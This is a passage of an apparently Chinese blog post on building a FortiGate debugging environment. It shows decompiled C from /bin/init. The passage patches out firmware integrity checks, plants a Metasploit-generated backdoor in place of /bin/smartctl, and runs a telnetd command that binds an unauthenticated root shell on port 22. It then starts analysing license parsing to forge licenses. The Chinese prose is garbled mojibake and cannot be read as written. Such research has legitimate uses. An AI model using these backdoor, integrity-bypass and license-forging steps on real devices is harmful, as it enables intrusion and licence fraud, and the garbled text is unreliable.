class="keyword">if</span> ( RSA_public_decrypt(v17, v21, &amp;v19, v14, <span class="number">1LL</span>) == v8 )</span><br><span class="line">          v10 = <span class="built_in">memcmp</span>(ptr, &amp;v19, v8) == <span class="number">0</span>;</span><br><span class="line">        RSA_free(v14);</span><br><span class="line">      &#125;</span><br><span class="line">      EVP_PKEY_free(v12);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(v9);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v10) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å‡½æ•°å¼€å¤´é€šè¿‡å¼‚æˆ–è¿ç®—å¤„ç†äº†ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè§£å¯†ä¹‹åå¾—åˆ°ç»“æœ <code>/.fgtsum</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env1_3.png"
                     
                ></p>
<p>åœ¨æ ¹ç›®å½•èƒ½æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆæ˜¾ç„¶æ­¤å‡½æ•°å°±æ˜¯åˆ©ç”¨è¯¥æ–‡ä»¶å®ç°äº†æŸäº›ç³»ç»Ÿæ ¡éªŒã€‚</p>
<p>ç¬¬ä¸‰ä¸ªå‡½æ•°(sub_2745D50)ä¼¼ä¹å’Œ FIPS æ¨¡å¼ç›¸å…³ï¼ŒFIPS ç®€å•æ¥è¯´æ˜¯ç¾å›½æ”¿åºœé’ˆå¯¹è®¡ç®—æœºç³»ç»Ÿå®šä¹‰çš„ä¸€ç§æ ‡å‡†åŒ–ä¿¡æ¯å¤„ç†æ–¹å¼ï¼Œæ—¨åœ¨æå‡ä¿¡æ¯çš„å®‰å…¨æ€§ã€‚ç¬¬å››ä¸ªå‡½æ•°(sub_44F1F0)åŒæ · fork å‡ºäº†å­è¿›ç¨‹ï¼Œç›¸å…³é€»è¾‘</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">sub_2780BD0</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// r12</span></span><br><span class="line">  _BOOL8 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [rsp+8h] [rbp-138h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">268</span>]; <span class="comment">// [rsp+10h] [rbp-130h] BYREF</span></span><br><span class="line">  __int16 v6; <span class="comment">// [rsp+11Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+11Eh] [rbp-22h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+128h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  qmemcpy(v5, &amp;off_35CFDC0, <span class="keyword">sizeof</span>(v5));</span><br><span class="line">  v6 = <span class="number">256</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v4 = v5;</span><br><span class="line">  v1 = d2i_RSAPublicKey(<span class="number">0LL</span>, &amp;v4, <span class="number">270LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &amp;&amp; (v2 = v1, !sub_2746F20(<span class="string">&quot;/data/rootfs.gz&quot;</span>, <span class="string">&quot;/data/rootfs.gz.chk&quot;</span>, a1, v1)) )</span><br><span class="line">    result = sub_2746F20(<span class="string">&quot;/data/flatkc&quot;</span>, <span class="string">&quot;/data/flatkc.chk&quot;</span>, a1, v2) == <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ­¤å‡½æ•°å®ç°å¯¹ rootfs.gz çš„åˆ¤æ–­ã€‚</p>
<p>åˆ°è¿™é‡Œå¯ä»¥å¤§ä½“æ¨æ–­æ–‡ä»¶ç³»ç»Ÿçš„æ ¡éªŒæ˜¯åœ¨ç”¨æˆ·æ€ç¨‹åº &#x2F;bin&#x2F;init ä¸­å®ç°çš„ã€‚ç›¸å…³é€»è¾‘å¹¶ä¸å¤æ‚ï¼Œæˆ‘ä»¬å¯ä»¥æ·±å…¥ç ”ç©¶ä»¥ä¾¿äºæ‰“åŒ…ä¸€ä»½åˆé€‚çš„ rootfs.gz é€šè¿‡æ ¡éªŒï¼Œæˆ–è€…é‡‡ç”¨æ›´ç®€å•çš„æ–¹æ³•å³ patch æ‰æ ¡éªŒé€»è¾‘ã€‚</p>
<p>ç»è¿‡éªŒè¯ï¼Œåªéœ€è¦ patch fgtsum å’Œ rootfs ä¸¤ä¸ªæ£€éªŒå³å¯ï¼Œå°†å¯¹åº”è·³è½¬æŒ‡ä»¤å–åï¼Œä¿å­˜å¹¶æ›¿æ¢åŸå§‹æ–‡ä»¶ã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( sub_44F240() )</span><br><span class="line">  do_halt();</span><br><span class="line"><span class="keyword">if</span> ( sub_44F1A0(<span class="number">1LL</span>, <span class="string">&quot;%s()-%d: %s: run_initlevel(SYSINIT)\n\n&quot;</span>) )</span><br><span class="line">  do_halt();</span><br><span class="line"><span class="keyword">if</span> ( sub_2745D50() )</span><br><span class="line">&#123;</span><br><span class="line">  sub_2825E00();</span><br><span class="line">  <span class="keyword">if</span> ( sub_44DFC0(<span class="string">&quot;/bin/fips_self_test&quot;</span>) )</span><br><span class="line">    do_halt();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !sub_44F1F0(<span class="number">1LL</span>, <span class="string">&quot;%s()-%d: %s: run_initlevel(SYSINIT)\n\n&quot;</span>) )</span><br><span class="line">    do_halt();</span><br><span class="line">  sub_2781560();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æˆ–è€…ï¼Œæˆ‘ä»¬ä½¿ç”¨æ›´ç®€å•çš„è¡¥ä¸ï¼Œç›´æ¥å°† do_halt å‡½æ•°çš„ç¬¬ä¸€æ¡æŒ‡ä»¤æ”¹ä¸º retï¼Œè¿™æ ·å°±ç®—æ— æ³•é€šè¿‡éªŒè¯ï¼Œä¹Ÿä¸ä¼šæ‰§è¡Œé‡å¯æ“ä½œã€‚</p>
<h2 id="æ¤å…¥åé—¨å¹¶å¯åŠ¨"><a href="#æ¤å…¥åé—¨å¹¶å¯åŠ¨" class="headerlink" title="æ¤å…¥åé—¨å¹¶å¯åŠ¨"></a>æ¤å…¥åé—¨å¹¶å¯åŠ¨</h2><p>åç»­çš„æ“ä½œå’Œå‚è€ƒæ–‡ç« æåˆ°çš„ç±»ä¼¼ï¼Œå…ˆç”¨ msf ç”Ÿæˆä¸€ä¸ªåé—¨ç¨‹åºï¼Œæ›¿æ¢ &#x2F;bin&#x2F;smartctl æ–‡ä»¶ï¼Œç„¶åå°† patch çš„ init ç¨‹åºæ›¿æ¢ &#x2F;bin&#x2F;initï¼ŒåŒæ—¶åœ¨ç³»ç»Ÿä¸­æ”¾ç½®ä¸€ä¸ª busybox å¹¶å°† &#x2F;bin&#x2F;sh æŒ‡å‘ busybox æ–¹ä¾¿åç»­ä½¿ç”¨ã€‚</p>
<p>æ ¹æ®å‰é¢çš„æ–‡ç« æˆ‘ä»¬çŸ¥é“ç³»ç»Ÿå¯åŠ¨æ—¶ä¼šé¦–å…ˆæ‰§è¡Œ &#x2F;sbin&#x2F;initï¼Œè¿™ä¸ªç¨‹åºçš„é€»è¾‘å¾ˆç®€å•ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *argv[<span class="number">4</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  argv[<span class="number">3</span>] = (<span class="type">char</span> *)__readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_4017D0(a1, a2, a3);</span><br><span class="line">  unlink(<span class="string">&quot;/sbin/init.chk&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)sub_401AD0(<span class="string">&quot;bin&quot;</span>) &gt;= <span class="number">0</span> &amp;&amp; (<span class="type">int</span>)sub_401AD0(<span class="string">&quot;migadmin&quot;</span>) &gt;= <span class="number">0</span> &amp;&amp; (<span class="type">int</span>)sub_401AD0(<span class="string">&quot;node-scripts&quot;</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">    sub_401AD0(<span class="string">&quot;usr&quot;</span>);</span><br><span class="line">  argv[<span class="number">0</span>] = <span class="string">&quot;/bin/init&quot;</span>;</span><br><span class="line">  argv[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  execve(<span class="string">&quot;/bin/init&quot;</span>, argv, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å®ƒè´Ÿè´£è§£å‹å„ä¸ªå‹ç¼©åŒ…å¹¶å”¤èµ· &#x2F;bin&#x2F;init ç»§ç»­æ‰§è¡Œï¼Œæ²¡æœ‰å…¶ä»–æ“ä½œã€‚æ–¹ä¾¿èµ·è§æˆ‘ä»¬è·³è¿‡é‡æ–°æ‰“åŒ… xxx.tar.xz çš„æ­¥éª¤ï¼Œåœ¨ç³»ç»Ÿå¯åŠ¨è¿‡ç¨‹ä¸­è°ƒè¯•å†…æ ¸å¹¶ä¿®æ”¹å†…æ ¸å‚æ•°ï¼Œè®©å®ƒç›´æ¥å»æ‰§è¡Œ &#x2F;bin&#x2F;init ç¨‹åºã€‚</p>
<p>æ‰“åŒ…å‘½ä»¤</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">find . | cpio -H newc -o &gt; ../rootfs.raw</span><br><span class="line"><span class="built_in">cat</span> ./rootfs.raw | gzip &gt; rootfs.gz</span><br></pre></td></tr></table></figure></div>

<p>å°†æ–°çš„ rootfs.gz æ›¿æ¢åˆ°ç£ç›˜ä¸­ï¼ŒæŒ‚è½½åˆ°åŸå…ˆç³»ç»Ÿä¸Šï¼Œå¹¶æ·»åŠ è°ƒè¯•æ¡¥ã€‚</p>
<p>å¯åŠ¨æ—¶ç”¨ gdb é™„åŠ ï¼Œå¹¶å®šä½åˆ°æ‰§è¡Œç”¨æˆ·ç©ºé—´ç¨‹åºä½ç½®ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env1_4.png"
                     
                ></p>
<p>æ­¤æ—¶æ‰§è¡Œçš„ç›®æ ‡ç¨‹åºä¸º &#x2F;sbin&#x2F;init</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env1_5.png"
                     
                ></p>
<p>æˆ‘ä»¬å°†å…¶ä¿®æ”¹æˆ &#x2F;bin&#x2F;initï¼Œç„¶åç»§ç»­æ‰§è¡Œï¼Œç³»ç»Ÿå°†æ­£å¸¸å¯åŠ¨ï¼Œæ‰§è¡Œå‘½ä»¤ <code>diagnose hardware smartctl</code> å³å¯è§¦å‘åé—¨ç¨‹åºã€‚ç”±äºè®¾å¤‡å­˜åœ¨é˜²ç«å¢™ï¼Œç«¯å£ä¸èƒ½éšä¾¿è®¿é—®ï¼Œæˆ‘ä»¬å°†å…¶è‡ªå¸¦çš„ sshd æœåŠ¡ kill æ‰å¹¶æ›¿æ¢æˆ telnetd åé—¨</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">killall sshd &amp;&amp; busybox telnetd -l /bin/sh -b 0.0.0.0 -p 22</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ ·å°±å¯ä»¥è·å–ä¸€ä¸ªå®Œæ•´çš„ root æƒé™ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env1_6.png"
                     
                ></p>
<p>å¦å¤–ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æˆ‘ç¼–å†™çš„ä¸€ä¸ªç®€å•<a class="link"   href="https://github.com/rrrrrrri/fgt-auto-repack" >å·¥å…·<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ï¼Œä½¿ç”¨æ–¹æ³•è¯·å‚è€ƒè¯´æ˜æ–‡æ¡£ã€‚</p>
<h2 id="License-æˆæƒåˆ†æ"><a href="#License-æˆæƒåˆ†æ" class="headerlink" title="License æˆæƒåˆ†æ"></a>License æˆæƒåˆ†æ</h2><p>ç¬¬ä¸€æ¬¡å¯åŠ¨ç³»ç»Ÿæ—¶ï¼Œéœ€è¦å¯¼å…¥ä¸€ä¸ªåˆé€‚çš„ License æ‰èƒ½ä½¿ç”¨å„é¡¹åŠŸèƒ½ï¼Œåœ¨å‰é¢çš„æ–‡ç« ä¸­æˆ‘ä»¬æåˆ°å¯ä»¥æ³¨å†Œ FortiCloud è´¦æˆ·å¹¶ä½¿ç”¨è¯„ä¼°ç‰ˆæœ¬ Licenseï¼Œä¸è¿‡è¿™æ ·æ“ä½œæ¯”è¾ƒå¤æ‚ï¼Œè€Œä¸”æ¯æœ‰ä¸€ä¸ªæ–°ç‰ˆæœ¬å°±è¦é‡æ–°æ³¨å†Œä¸€ä¸ªè´¦æˆ·ï¼Œæœ‰æ²¡æœ‰ä¸€ç§æ–¹æ³•å¯ä»¥ç»•è¿‡æˆ–è€…ç ´è§£ License éªŒè¯å‘¢ï¼Ÿæœ¬éƒ¨åˆ†å°†ä¼šä»‹ç»ä¸€ç§æ„é€  License çš„æ–¹æ³•ã€‚</p>
<p>é¦–å…ˆå®šä½æ ¡éªŒ License çš„é€»è¾‘ï¼Œé€šè¿‡æŸ¥è¯¢ FortiGate æ‰‹å†Œï¼Œå¾—çŸ¥å­˜åœ¨ä¸€ä¸ªå«åš <code>vm-print-license</code> çš„è°ƒè¯•å‘½ä»¤ï¼Œä½¿ç”¨æ–¹æ³•ä¸º <code>diagnose debug vm-print-license</code>ï¼Œåœ¨æœªæ¿€æ´»çŠ¶æ€ä¸‹æ‰§è¡Œä¼šçœ‹åˆ°ä»¥ä¸‹è¾“å‡ºï¼Œæç¤ºæˆ‘ä»¬å½“å‰å¤„äºè¯•ç”¨çŠ¶æ€ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env1_7.png"
                     
                ></p>
<p>ç³»ç»Ÿå¤§éƒ¨åˆ†ä¸šåŠ¡é€»è¾‘éƒ½åœ¨ &#x2F;bin&#x2F;init ä¸­ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨ &#x2F;bin&#x2F;init ç¨‹åºä¸­æœç´¢ <code>License</code>ã€<code>vm-print-license</code> ç­‰å­—ç¬¦ä¸²ï¼Œåœ¨ç»“æœä¸­æ‰¾åˆ°æ¯”è¾ƒæœ‰è¶£çš„å‡ æ¡æ•°æ®ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fortigate_debug_env1_8.png"
                     
                ></p>
<p>çœ‹èµ·æ¥åƒ License æ–‡ä»¶çš„å®šä½ç¬¦ï¼Œäº¤å‰å¼•ç”¨æœ€ç»ˆå¯å®šä½åˆ°ä»¥ä¸‹ä»£ç </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">maybe_check_license</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// r13</span></span><br><span class="line">  <span class="type">time_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> *lic_file_content; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  __int64 lic_length; <span class="comment">// [rsp+8h] [rbp-68h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tm</span> <span class="title">tp</span>;</span> <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+48h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  lic_file_content = <span class="number">0LL</span>;</span><br><span class="line">  lic_length = <span class="number">0LL</span>;</span><br><span class="line">  read_file(<span class="string">&quot;/data/etc/vm.lic&quot;</span>, &amp;lic_file_content, &amp;lic_length);<span class="comment">// è¯»å– vm.lic æ–‡ä»¶</span></span><br><span class="line">  <span class="keyword">if</span> ( lic_length &amp;&amp; lic_file_content )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = <span class="number">0LL</span>;</span><br><span class="line">    init_lic_struct(&amp;lic_struct);</span><br><span class="line">    v1 = sub_29200D0(lic_file_content, lic_length, &amp;lic_struct);</span><br><span class="line">    v2 = lic_struct;</span><br><span class="line">    <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="built_in">strncmp</span>(v2, lincese_types[v0].name, <span class="number">6uLL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( ++v0 == <span class="number">27</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">      &#125;</span><br><span class="line">      license_tag_val = lincese_types[v0].tag_val;<span class="comment">// 0x16</span></span><br><span class="line">LABEL_8:</span><br><span class="line">      <span class="keyword">if</span> ( qword_F5E2DC8 )</span><br><span class="line">      &#123;</span><br><span class="line">        strptime(qword_F5E2DC8, <span class="string">&quot;%a %b %e %H:%M:%S %Y&quot;</span>, &amp;tp);</span><br><span class="line">        v3 = timegm(&amp;tp);</span><br><span class="line">        qword_F5E2DF8 = v3;</span><br><span class="line">        <span class="keyword">if</span> ( nCfg_debug_zone )</span><br><span class="line">          *(nCfg_debug_zone + <span class="number">3559</span>) = v3;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(lic_file_content);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v8 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¯¥å‡½æ•°å°è¯•è¯»å– &#x2F;data&#x2F;etc&#x2F;vm.lic æ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨ sub_29200D0 å¯¹å…¶è§£æã€‚ç”±äºå·²ç»è·å–åˆ°äº† shell æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœªæ¿€æ´»æ—¶è¿™ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN FGT VM LICENSE-----</span><br><span class="line">IAAAAJ89UQoa5fpHDP95to/FvROLPIKeChd2EMS1QHS43LMGUAAAAGULEt3EN96B</span><br><span class="line">mKhmST8dR9f5RV2Yfp6EojX+Rx92RqAf+vBkeklRAh+GglCJzHRgGCqhgedueWbt</span><br><span class="line">YQ/dmgF7MWbFqOkYRXjiaLPznTCafNb8</span><br><span class="line">-----END FGT VM LICENSE-----</span><br></pre></td></tr></table></figure></div>

<p>è¿™è¿›ä¸€æ­¥å°è¯äº†æˆ‘ä»¬çš„çŒœæƒ³ï¼Œå³è¿™éƒ¨åˆ†ä»£ç é€»è¾‘å’Œ License æœ‰è¾ƒå¤§å…³ç³»ã€‚</p>
<p>å¤–å±‚å‡½æ•° maybe_check_license çš„é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œé¦–å…ˆä» &#x2F;data&#x2F;etc&#x2F;vm.lic ä¸­è¯»å–æˆæƒä¿¡æ¯ï¼Œæ¥ç€è°ƒç”¨ init_lic_struct å‡½æ•°åˆå§‹åŒ–ä¸€ä¸ªå…¨å±€å˜é‡ç»“æ„ä½“ lic_structï¼Œç„¶åä½¿ç”¨ sub_29200D0 å‡½æ•°è§£ææˆæƒæ–‡ä»¶</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_29200D0</span><span class="params">(<span class="type">char</span> *lic_file_content, __int64 lic_length, lic_struct *lic_struct)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *lic_start; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">char</span> *lic_end; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *lic_end_1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> *<span class="type">lic_start_t</span>; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> __int16 *v8; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *decode_content; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *decode_content_2; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">  __int64 v12; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v13; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v14; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v15; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">size_t</span> enc_data_length; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v17; <span class="comment">// rax</span></span><br><span class="line">  __int64 v18; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// eax</span></span><br><span class="line">  __m128i *v20; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// er13</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v22; <span class="comment">// er14</span></span><br><span class="line">  <span class="type">char</span> *aes_decrypted_1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v24; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">char</span> *data_start; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">char</span> *v26; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 key_name_length; <span class="comment">// rcx</span></span><br><span class="line">  _DWORD *v28; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">char</span> *v29; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">size_t</span> key_value_length; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">unsigned</span> __int32 *key_value; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">char</span> key_flag; <span class="comment">// dl</span></span><br><span class="line">  <span class="type">bool</span> v34; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">void</span> *aes_enc_data; <span class="comment">// [rsp+8h] [rbp-198h]</span></span><br><span class="line">  __m128i *ptr; <span class="comment">// [rsp+10h] [rbp-190h]</span></span><br><span class="line">  __int64 v37; <span class="comment">// [rsp+20h] [rbp-180h]</span></span><br><span class="line">  <span class="type">char</span> *decode_content_1; <span class="comment">// [rsp+28h] [rbp-178h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int32 v39; <span class="comment">// [rsp+3Ch] [rbp-164h] BYREF</span></span><br><span class="line">  __m128i aes_key; <span class="comment">// [rsp+40h] [rbp-160h] BYREF</span></span><br><span class="line">  __m128i v41; <span class="comment">// [rsp+50h] [rbp-150h]</span></span><br><span class="line">  <span class="type">char</span> key_name[<span class="number">264</span>]; <span class="comment">// [rsp+60h] [rbp-140h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v43; <span class="comment">// [rsp+168h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  v43 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  lic_struct-&gt;SERIALNO = <span class="number">0LL</span>;</span><br><span class="line">  lic_struct-&gt;unknow9 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(</span><br><span class="line">    (&amp;lic_struct-&gt;unknow2 &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL),</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">8LL</span> * ((lic_struct - ((lic_struct + <span class="number">8</span>) &amp; <span class="number">0xFFFFFFF8</span>) + <span class="number">168</span>) &gt;&gt; <span class="number">3</span>));</span><br><span class="line">  <span class="keyword">if</span> ( lic_file_content )</span><br><span class="line">  &#123;</span><br><span class="line">    lic_start = <span class="built_in">strstr</span>(lic_file_content, <span class="string">&quot;-----BEGIN FGT VM LICENSE-----&quot;</span>);<span class="comment">// åˆ¤æ–­æ˜¯å¦åŒ…å«è¿™ä¸¤ä¸ª banner</span></span><br><span class="line">    lic_end = <span class="built_in">strstr</span>(lic_file_content, <span class="string">&quot;-----END FGT VM LICENSE-----&quot;</span>);</span><br><span class="line">    lic_end_1 = lic_end;</span><br><span class="line">    <span class="keyword">if</span> ( lic_start )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( lic_end )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="type">lic_start_t</span> = lic_start + <span class="number">30</span>;           <span class="comment">// è·³è¿‡å¼€å¤´</span></span><br><span class="line">        <span class="keyword">if</span> ( lic_end &gt; <span class="type">lic_start_t</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v8 = *__ctype_b_loc();</span><br><span class="line">          <span class="keyword">while</span> ( (v8[*<span class="type">lic_start_t</span>] &amp; <span class="number">0x2000</span>) != <span class="number">0</span> )<span class="comment">// _ISspace</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( lic_end_1 == ++<span class="type">lic_start_t</span> )</span><br><span class="line">              <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( lic_end_1 &gt; <span class="type">lic_start_t</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">while</span> ( (v8[*lic_end_1] &amp; <span class="number">0x2000</span>) != <span class="number">0</span> )<span class="comment">// _ISspace</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( --lic_end_1 == <span class="type">lic_start_t</span> ) <span class="comment">// è·³è¿‡å¼€å¤´å’Œç»“å°¾å¤šä½™çš„ç©ºç™½å­—ç¬¦</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( lic_end_1 &gt; <span class="type">lic_start_t</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              *lic_end_1 = <span class="number">0</span>;</span><br><span class="line">              decode_content = <span class="built_in">malloc</span>(<span class="number">3</span> * ((lic_end_1 - <span class="type">lic_start_t</span> + <span class="number">3</span>) &gt;&gt; <span class="number">2</span>));<span class="comment">// åˆ†é…ç©ºé—´ï¼Œç”¨äºå­˜æ”¾ Base64 è§£ç åçš„å†…å®¹</span></span><br><span class="line">              decode_content_1 = decode_content;</span><br><span class="line">              decode_content_2 = decode_content;</span><br><span class="line">              <span class="keyword">if</span> ( decode_content )</span><br><span class="line">              &#123;</span><br><span class="line">                v11 = maybe_base64_decode(<span class="type">lic_start_t</span>, decode_content, <span class="number">3</span> * ((lic_end_1 - <span class="type">lic_start_t</span> + <span class="number">3</span>) &gt;&gt; <span class="number">2</span>));<span class="comment">// base64 è§£ç </span></span><br><span class="line">                *lic_end_1 = <span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span> ( v11 &lt;= <span class="number">15</span></span><br><span class="line">                  || (v12 = *decode_content_2,  <span class="comment">// AES key é•¿åº¦</span></span><br><span class="line">                      v13 = decode_content_2,</span><br><span class="line">                      v14 = (decode_content_2 + <span class="number">1</span>),</span><br><span class="line">                      v15 = (v14 + v12),</span><br><span class="line">                      v14 + v12 &gt; v13 + v11)</span><br><span class="line">                  || (enc_data_length = *v15, aes_enc_data = v15 + <span class="number">1</span>, (v37 = decode_pub_key()) == <span class="number">0</span>) )</span><br><span class="line">                &#123;</span><br><span class="line">                  v22 = <span class="number">-1</span>;</span><br><span class="line">                  <span class="built_in">free</span>(decode_content_1);</span><br><span class="line">                  <span class="keyword">return</span> v22;</span><br><span class="line">                &#125;</span><br><span class="line">                v17 = EVP_PKEY_get1_RSA(v37);</span><br><span class="line">                v18 = v17;</span><br><span class="line">                <span class="keyword">if</span> ( v17 )</span><br><span class="line">                &#123;</span><br><span class="line">                  v19 = RSA_size(v17);</span><br><span class="line">                  v20 = <span class="built_in">calloc</span>(v19, <span class="number">1uLL</span>);</span><br><span class="line">                  <span class="keyword">if</span> 